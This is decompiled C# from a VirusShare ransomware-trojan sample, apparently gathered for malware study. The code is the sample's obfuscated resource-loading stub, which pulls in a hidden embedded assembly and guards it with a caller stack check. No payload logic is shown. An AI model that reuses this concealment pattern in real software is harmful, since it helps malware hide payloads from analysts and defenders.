// Decompiled with JetBrains decompiler
// Type: .
// Assembly: SEX2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=a5787988e1da7ee4
// MVID: 027F678B-7D46-4866-9354-BA5F76CF2B30
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.asdg-51ed8d1a92fbb8f059c9595d28994dd3b17eb92e.exe

using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u0001
{
  internal sealed class \u0008
  {
    private static Assembly \u0001;
    private static string[] \u0001;

    internal static void \u0002()
    {
      try
      {
        try
        {
          AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(\u0001.\u0008.\u0002);
        }
        catch (Exception ex)
        {
        }
      }
      catch (Exception ex)
      {
        \u0008.\u0008.\u0002(ex);
        throw;
      }
    }

    private static Assembly \u0002([In] object obj0, [In] ResolveEventArgs obj1)
    {
      string[] strArray1;
      string name;
      int index;
      try
      {
        if ((object) \u0001.\u0008.\u0001 == null)
        {
          Monitor.Enter((object) (strArray1 = \u0001.\u0008.\u0001));
          try
          {
            \u0001.\u0008.\u0001 = Assembly.Load("{26a98130-7300-4af8-ab45-13eb906a70fd}, PublicKeyToken=3e56350693f7355e");
            if ((object) \u0001.\u0008.\u0001 != null)
              \u0001.\u0008.\u0001 = \u0001.\u0008.\u0001.GetManifestResourceNames();
          }
          finally
          {
            Monitor.Exit((object) strArray1);
          }
        }
        name = obj1.Name;
        if (true)
        {
          index = 0;
          while (true)
          {
            int num1 = index;
            int num2 = \u0001.\u0008.\u0001.Length;
            if (true)
              goto label_17;
label_8:
            if (num2 != 0)
              goto label_18;
label_9:
            if (num2 == 0)
            {
              if (num1 == 0)
                num1 = index;
              else
                break;
            }
            index = num1 + 1;
            continue;
label_17:
            num2 = num2;
label_18:
            if (true)
            {
              if (num1 < num2)
              {
                int num3 = \u0001.\u0008.\u0001[index] == name ? 1 : 0;
                num2 = 0;
                num1 = num3;
                goto label_8;
              }
              else
                goto label_20;
            }
            else
              goto label_9;
          }
          if (!\u0001.\u0008.\u0002())
            return (Assembly) null;
          goto label_13;
label_20:
          return (Assembly) null;
        }
label_13:
        return \u0001.\u0008.\u0001;
      }
      catch (Exception ex)
      {
        string str = name;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) index;
        string[] strArray2 = strArray1;
        object obj = obj0;
        ResolveEventArgs resolveEventArgs = obj1;
        \u0008.\u0008.\u0002(ex, (object) str, (object) local, (object) strArray2, obj, (object) resolveEventArgs);
        throw;
      }
    }

    private static bool \u0002()
    {
      int index1;
      StackFrame[] frames;
      StackFrame stackFrame1;
      try
      {
        bool flag;
        try
        {
          if (true)
          {
            frames = new StackTrace().GetFrames();
            index1 = 2;
            while (true)
            {
              int num1 = index1;
              while (true)
              {
                int length = frames.Length;
                if (num1 >= length)
                {
                  flag = false;
                  goto label_17;
                }
                else
                {
                  stackFrame1 = frames[index1];
                  if ((object) stackFrame1.GetMethod().Module.Assembly == (object) Assembly.GetExecutingAssembly())
                  {
                    int num2 = 1;
                    if (num2 != 0)
                    {
                      flag = num2 != 0;
                      goto label_17;
                    }
                    else
                      num1 = num2;
                  }
                  else
                  {
                    num1 = index1 + 1;
                    break;
                  }
                }
              }
              index1 = num1;
            }
          }
        }
        catch
        {
          int num;
          for (int index2 = 0; index2 == 0; index2 = num)
          {
            num = 1;
            if (num != 0)
            {
              flag = num != 0;
              break;
            }
          }
        }
label_17:
        return flag;
      }
      catch (Exception ex)
      {
        StackFrame[] stackFrameArray = frames;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) index1;
        StackFrame stackFrame2 = stackFrame1;
        bool flag;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local2 = (ValueType) flag;
        \u0008.\u0008.\u0002(ex, (object) stackFrameArray, (object) local1, (object) stackFrame2, (object) local2);
        throw;
      }
    }

    public \u0008()
    {
      try
      {
      }
      catch (Exception ex)
      {
        \u0008.\u0008.\u0002(ex, (object) this);
        throw;
      }
    }

    static \u0008()
    {
      try
      {
        \u0001.\u0008.\u0001 = (Assembly) null;
        \u0001.\u0008.\u0001 = new string[0];
      }
      catch (Exception ex)
      {
        \u0008.\u0008.\u0002(ex);
        throw;
      }
    }
  }
}
